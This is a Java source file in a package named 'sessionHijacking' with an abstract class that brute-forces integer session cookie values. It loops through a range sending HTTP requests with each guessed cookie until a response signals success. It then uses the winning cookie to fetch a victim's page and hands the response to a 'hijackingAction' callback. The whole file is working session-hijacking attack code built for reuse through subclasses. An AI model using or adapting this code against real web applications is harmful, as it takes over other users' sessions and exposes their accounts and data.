package sessionHijacking;

import responseReader.HttpURLConnectionResponseReader;

import java.net.HttpURLConnection;
import java.util.function.Consumer;

public abstract class IntegerCookieValueGuesser {

    private final int guessFrom;
    private final int guessTo;
    private final HttpURLConnectionResponseReader responseReader;

    public IntegerCookieValueGuesser(int guessFrom, int guessTo,
                                     HttpURLConnectionResponseReader responseReader) {
        this.guessFrom = guessFrom;
        this.guessTo = guessTo;
        this.responseReader = responseReader;
    }

    public void doSessionHijacking(Consumer<String> hijackingAction) throws Throwable{
        int cookieValue = guessCookieValue();
        String cookie = String.format(getCookieTemplate(), cookieValue);
        HttpURLConnection httpURLConnection = getHttpURLConnection(cookie);
        String response = responseReader.read(httpURLConnection);
        httpURLConnection.disconnect();
        hijackingAction.accept(response);
    }

    private int guessCookieValue() throws Throwable{
        String cookieTemplate = getCookieTemplate();
        for(int i = guessFrom; i <= guessTo; i++){
            String cookie = String.format(cookieTemplate, i);
            HttpURLConnection httpURLConnection = getHttpURLConnection(cookie);
            String response = responseReader.read(httpURLConnection);
            if(isGuessSuccessful(response)){
                return i;
            }
            httpURLConnection.disconnect();
        }
        throw new IllegalStateException("Invalid range");
    }

    protected abstract boolean isGuessSuccessful(String response);

    protected abstract String getCookieTemplate();

    protected abstract HttpURLConnection getHttpURLConnection(String cookie) throws Exception;

}
